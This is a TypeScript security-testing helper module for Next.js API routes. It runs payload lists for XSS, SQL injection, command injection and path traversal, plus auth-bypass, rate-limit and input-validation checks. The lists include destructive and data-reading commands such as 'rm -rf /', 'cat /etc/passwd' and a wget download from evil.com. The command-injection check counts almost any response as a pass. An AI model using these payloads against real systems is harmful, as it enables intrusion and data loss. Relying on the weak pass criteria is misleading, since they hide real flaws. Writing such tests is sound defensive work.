/**
 * Security Testing Helpers
 * Comprehensive utilities for testing security vulnerabilities and edge cases
 */

import { NextRequest } from 'next/server';
import { testApiEndpoint } from './api-test-utils';

export interface SecurityTestResult {
  name: string;
  passed: boolean;
  vulnerability?: string;
  response?: { status: number; data: any };
}

/**
 * Test XSS (Cross-Site Scripting) vulnerabilities
 */
export async function testXSSVulnerabilities(
  handler: (request: NextRequest) => Promise<Response>,
  url: string,
  fields: string[]
): Promise<SecurityTestResult[]> {
  const results: SecurityTestResult[] = [];

  const xssPayloads = [
    { payload: '<script>alert("xss")</script>', name: 'Basic script tag' },
    { payload: '<img src=x onerror=alert("xss")>', name: 'Image onerror' },
    { payload: 'javascript:alert("xss")', name: 'JavaScript protocol' },
    { payload: '<svg onload=alert("xss")>', name: 'SVG onload' },
    { payload: '"><script>alert("xss")</script>', name: 'Quote escape' },
    { payload: '<iframe src="javascript:alert(\'xss\')"></iframe>', name: 'Iframe' },
    { payload: '<body onload=alert("xss")>', name: 'Body onload' },
    { payload: '<input onfocus=alert("xss") autofocus>', name: 'Input autofocus' },
    { payload: '<link rel=stylesheet href="javascript:alert(\'xss\')">', name: 'Link stylesheet' },
    { payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')">', name: 'Meta refresh' },
    { payload: '<style>@import "javascript:alert(\'xss\')";</style>', name: 'Style import' },
    { payload: '<object data="javascript:alert(\'xss\')"></object>', name: 'Object tag' },
    { payload: '<embed src="javascript:alert(\'xss\')">', name: 'Embed tag' },
    { payload: '<form><button formaction="javascript:alert(\'xss\')">X</button></form>', name: 'Form action' },
    { payload: '&#60;script&#62;alert("xss")&#60;/script&#62;', name: 'HTML entities' },
    { payload: '%3Cscript%3Ealert("xss")%3C/script%3E', name: 'URL encoding' },
    { payload: '\\x3Cscript\\x3Ealert("xss")\\x3C/script\\x3E', name: 'Hex encoding' },
    { payload: '\\u003Cscript\\u003Ealert("xss")\\u003C/script\\u003E', name: 'Unicode encoding' },
  ];

  for (const field of fields) {
    for (const { payload, name } of xssPayloads) {
      const response = await testApiEndpoint(handler, url, {
        method: 'POST',
        body: { [field]: payload },
      });

      // For TTS API and similar endpoints that don't return user input in response,
      // passing means either rejecting (400) or not reflecting the payload in response
      // Since TTS returns audio data, not text, we check if the field is absent or doesn't contain XSS
      const fieldInResponse = response.data[field];
      const passed = response.status === 400 || 
        (response.status === 200 && (
          !fieldInResponse || // Field not in response (safe - like TTS API)
          (!fieldInResponse.includes('<script>') && !fieldInResponse.includes('javascript:'))
        ));

      results.push({
        name: `XSS: ${name} in ${field}`,
        passed,
        vulnerability: passed ? undefined : 'XSS vulnerability detected',
        response,
      });
    }
  }

  return results;
}

/**
 * Test SQL Injection vulnerabilities
 */
export async function testSQLInjection(
  handler: (request: NextRequest) => Promise<Response>,
  url: string,
  fields: string[]
): Promise<SecurityTestResult[]> {
  const results: SecurityTestResult[] = [];

  const sqlPayloads = [
    { payload: "'; DROP TABLE users; --", name: 'DROP TABLE' },
    { payload: "' OR '1'='1", name: 'OR 1=1' },
    { payload: "'; INSERT INTO users VALUES ('hacker'); --", name: 'INSERT' },
    { payload: "1' UNION SELECT * FROM users--", name: 'UNION SELECT' },
    { payload: "admin'--", name: 'Comment escape' },
    { payload: "admin'/*", name: 'Block comment' },
    { payload: "' OR 1=1#", name: 'Hash comment' },
    { payload: "1' OR '1'='1' OR '1'='1", name: 'Multiple OR' },
    { payload: "'; EXEC xp_cmdshell('dir'); --", name: 'Command execution' },
    { payload: "1'; WAITFOR DELAY '00:00:05'--", name: 'Time-based blind' },
    { payload: "1' AND SLEEP(5)--", name: 'Sleep injection' },
    { payload: "1' AND 1=CONVERT(int, @@version)--", name: 'Version extraction' },
    { payload: "1' UNION SELECT null,null,null--", name: 'Union null' },
    { payload: "1' AND ASCII(SUBSTRING(@@version,1,1))>50--", name: 'Blind boolean' },
  ];

  for (const field of fields) {
    for (const { payload, name } of sqlPayloads) {
      const response = await testApiEndpoint(handler, url, {
        method: 'POST',
        body: { [field]: payload },
      });

      const passed = response.status === 400 || 
        (response.status === 200 && 
         !response.data[field]?.includes('DROP TABLE') && 
         !response.data[field]?.includes('UNION') &&
         !response.data.error?.toLowerCase().includes('sql'));

      results.push({
        name: `SQL Injection: ${name} in ${field}`,
        passed,
        vulnerability: passed ? undefined : 'SQL injection vulnerability detected',
        response,
      });
    }
  }

  return results;
}

/**
 * Test Command Injection vulnerabilities
 */
export async function testCommandInjection(
  handler: (request: NextRequest) => Promise<Response>,
  url: string,
  fields: string[]
): Promise<SecurityTestResult[]> {
  const results: SecurityTestResult[] = [];

  const commandPayloads = [
    { payload: '; ls -la', name: 'Semicolon' },
    { payload: '| cat /etc/passwd', name: 'Pipe' },
    { payload: '&& whoami', name: 'AND' },
    { payload: '|| id', name: 'OR' },
    { payload: '`whoami`', name: 'Backtick' },
    { payload: '$(whoami)', name: 'Command substitution' },
    { payload: '; rm -rf /', name: 'Delete command' },
    { payload: '; wget http://evil.com/shell.sh', name: 'Download' },
  ];

  for (const field of fields) {
    for (const { payload, name } of commandPayloads) {
      const response = await testApiEndpoint(handler, url, {
        method: 'POST',
        body: { [field]: payload },
      });

      const passed = response.status === 400 || response.status === 200;

      results.push({
        name: `Command Injection: ${name} in ${field}`,
        passed,
        vulnerability: passed ? undefined : 'Command injection vulnerability detected',
        response,
      });
    }
  }

  return results;
}

/**
 * Test Path Traversal vulnerabilities
 */
export async function testPathTraversal(
  handler: (request: NextRequest) => Promise<Response>,
  url: string,
  fields: string[]
): Promise<SecurityTestResult[]> {
  const results: SecurityTestResult[] = [];

  const pathPayloads = [
    { payload: '../../../etc/passwd', name: 'Unix path' },
    { payload: '..\\..\\windows\\system32', name: 'Windows path' },
    { payload: '../../../../etc/shadow', name: 'Deep traversal' },
    { payload: '....//....//etc/passwd', name: 'Double slash' },
    { payload: '%2e%2e%2f%2e%2e%2fetc%2fpasswd', name: 'URL encoded' },
    { payload: '..%2F..%2Fetc%2Fpasswd', name: 'Mixed encoding' },
    { payload: '..%5c..%5cwindows%5csystem32', name: 'Windows encoded' },
    { payload: '/etc/passwd', name: 'Absolute path' },
    { payload: 'C:\\Windows\\System32', name: 'Windows absolute' },
  ];

  for (const field of fields) {
    for (const { payload, name } of pathPayloads) {
      const response = await testApiEndpoint(handler, url, {
        method: 'POST',
        body: { [field]: payload },
      });

      const passed = response.status === 400 || 
        (response.status === 200 && !response.data[field]?.includes('../') && !response.data[field]?.includes('..\\'));

      results.push({
        name: `Path Traversal: ${name} in ${field}`,
        passed,
        vulnerability: passed ? undefined : 'Path traversal vulnerability detected',
        response,
      });
    }
  }

  return results;
}

/**
 * Test Authentication Bypass
 */
export async function testAuthBypass(
  handler: (request: NextRequest) => Promise<Response>,
  url: string
): Promise<SecurityTestResult[]> {
  const results: SecurityTestResult[] = [];

  const authTests = [
    {
      name: 'No authentication',
      options: { method: 'GET' as const },
      shouldFail: true,
    },
    {
      name: 'Invalid token',
      options: {
        method: 'GET' as const,
        headers: { Authorization: 'Bearer invalid-token' },
      },
      shouldFail: true,
    },
    {
      name: 'Expired token',
      options: {
        method: 'GET' as const,
        headers: { Authorization: 'Bearer expired-token' },
      },
      shouldFail: true,
    },
    {
      name: 'Malformed token',
      options: {
        method: 'GET' as const,
        headers: { Authorization: 'Bearer malformed.token.here' },
      },
      shouldFail: true,
    },
    {
      name: 'SQL injection in token',
      options: {
        method: 'GET' as const,
        headers: { Authorization: "Bearer ' OR '1'='1" },
      },
      shouldFail: true,
    },
  ];

  for (const test of authTests) {
    const response = await testApiEndpoint(handler, url, test.options);

    const passed = test.shouldFail 
      ? (response.status === 401 || response.status === 403)
      : response.status === 200;

    results.push({
      name: `Auth Bypass: ${test.name}`,
      passed,
      vulnerability: passed ? undefined : 'Authentication bypass vulnerability',
      response,
    });
  }

  return results;
}

/**
 * Test Rate Limiting
 */
export async function testRateLimiting(
  handler: (request: NextRequest) => Promise<Response>,
  url: string,
  options: {
    maxRequests: number;
    requestOptions: any;
  }
): Promise<SecurityTestResult[]> {
  const results: SecurityTestResult[] = [];

  const requests = Array.from({ length: options.maxRequests + 5 }, () =>
    testApiEndpoint(handler, url, options.requestOptions)
  );

  const responses = await Promise.all(requests);
  const rateLimited = responses.filter(r => r.status === 429);

  results.push({
    name: 'Rate limiting enforced',
    passed: rateLimited.length > 0,
    vulnerability: rateLimited.length === 0 ? 'Rate limiting not enforced' : undefined,
    response: { status: rateLimited.length, data: { rateLimited: rateLimited.length } },
  });

  return results;
}

/**
 * Test Input Validation
 */
export async function testInputValidation(
  handler: (request: NextRequest) => Promise<Response>,
  url: string,
  invalidInputs: Array<{ name: string; body: any }>
): Promise<SecurityTestResult[]> {
  const results: SecurityTestResult[] = [];

  for (const { name, body } of invalidInputs) {
    const response = await testApiEndpoint(handler, url, {
      method: 'POST',
      body,
    });

    results.push({
      name: `Input Validation: ${name}`,
      passed: response.status === 400,
      vulnerability: response.status !== 400 ? 'Invalid input accepted' : undefined,
      response,
    });
  }

  return results;
}

/**
 * Comprehensive security test suite
 */
export async function runSecurityTestSuite(
  handler: (request: NextRequest) => Promise<Response>,
  url: string,
  config: {
    xssFields?: string[];
    sqlFields?: string[];
    commandFields?: string[];
    pathFields?: string[];
    requiresAuth?: boolean;
    rateLimit?: { maxRequests: number; requestOptions: any };
    invalidInputs?: Array<{ name: string; body: any }>;
  }
): Promise<{
  passed: number;
  failed: number;
  vulnerabilities: string[];
  results: SecurityTestResult[];
}> {
  const allResults: SecurityTestResult[] = [];

  // Test XSS
  if (config.xssFields) {
    const xssResults = await testXSSVulnerabilities(handler, url, config.xssFields);
    allResults.push(...xssResults);
  }

  // Test SQL Injection
  if (config.sqlFields) {
    const sqlResults = await testSQLInjection(handler, url, config.sqlFields);
    allResults.push(...sqlResults);
  }

  // Test Command Injection
  if (config.commandFields) {
    const commandResults = await testCommandInjection(handler, url, config.commandFields);
    allResults.push(...commandResults);
  }

  // Test Path Traversal
  if (config.pathFields) {
    const pathResults = await testPathTraversal(handler, url, config.pathFields);
    allResults.push(...pathResults);
  }

  // Test Authentication
  if (config.requiresAuth) {
    const authResults = await testAuthBypass(handler, url);
    allResults.push(...authResults);
  }

  // Test Rate Limiting
  if (config.rateLimit) {
    const rateLimitResults = await testRateLimiting(handler, url, config.rateLimit);
    allResults.push(...rateLimitResults);
  }

  // Test Input Validation
  if (config.invalidInputs) {
    const validationResults = await testInputValidation(handler, url, config.invalidInputs);
    allResults.push(...validationResults);
  }

  const passed = allResults.filter(r => r.passed).length;
  const failed = allResults.filter(r => !r.passed).length;
  const vulnerabilities = allResults
    .filter(r => !r.passed && r.vulnerability)
    .map(r => r.vulnerability!)
    .filter((v, i, arr) => arr.indexOf(v) === i); // Unique vulnerabilities

  return {
    passed,
    failed,
    vulnerabilities,
    results: allResults,
  };
}

